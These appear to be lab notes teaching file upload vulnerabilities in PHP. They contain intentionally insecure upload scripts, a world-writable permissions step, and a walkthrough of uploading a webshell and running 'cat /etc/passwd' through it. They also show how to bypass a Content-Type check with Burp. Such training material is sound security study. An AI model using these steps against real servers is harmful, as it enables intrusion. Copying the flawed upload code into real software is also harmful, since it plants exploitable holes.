File Upload Vulnerability

**********************************************************************************************************************************

Attacker abuses a file upload feature to upload malicious script
Script is executed and allows for further attacks -> webshell
Filters based on Content-Type, Extension names, Size etc.

**********************************************************************************************************************************

Set the permissions

$ chmod 777 uploads/

**********************************************************************************************************************************

Error Checking

upload.php just checks for errors in the file being uploaded

$ cat upload.php
<html>
<body>

<h3>Image File Upload Stats: </h3>

<?php

        if($_FILES["file"]["error"])
        {
                header("Location: file.html");
                die();
        }
        else{

                echo "Name: ".$_FILES["file"]["name"];
                echo "<br>Size: ".$_FILES["file"]["size"];
                echo "<br>Temp File: ".$_FILES["file"]["tmp_name"];

                move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/".$_FILES["file"]["name"]);
        }


?>

</body>
</html>
$

Upload simple-backdoor.php
http://localhost/file-upload-basic/file_upload/basic/uploads/simple-backdoor.php
Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
http://localhost/file-upload-basic/file_upload/basic/uploads/simple-backdoor.php?cmd=cat+/etc/passwd

**********************************************************************************************************************************

Content Type check

Common practice to check for Content-Types
Attacker can use an intercepting proxy and change the Content-Type to what is expected

upload.php just checks for errors in the file being uploaded and also the content type

$ cat upload.php
<html>
<body>

<h3>GIF Image File Upload Stats: </h3>

<?php

if ($_FILES["file"]["error"]) {
    header("Location: file.html");
    die();
}

if ($_FILES["file"]["type"] != "image/gif") {
    echo "Please upload a GIF file";
} else {

    echo "Name: " . $_FILES["file"]["name"];
    echo "<br>Size: " . $_FILES["file"]["size"];
    echo "<br>Temp File: " . $_FILES["file"]["tmp_name"];
    echo "<br>Type: " . $_FILES["file"]["type"];

    move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/" . $_FILES["file"]["name"]);
}


?>

</body>
</html>
$

In Burp
For GIF
Content-Disposition: form-data; name="file"; filename="action_back.gif"
Content-Type: image/gif

For backdoor
Content-Disposition: form-data; name="file"; filename="simple-backdoor.php"
Content-Type: application/x-php

Change to
Content-Disposition: form-data; name="file"; filename="simple-backdoor.php"
Content-Type: image/gif

In Browser
http://localhost/file_upload/content-type/uploads/simple-backdoor.php
http://localhost/file_upload/content-type/uploads/simple-backdoor.php?cmd=cat+/etc/passwd

**********************************************************************************************************************************
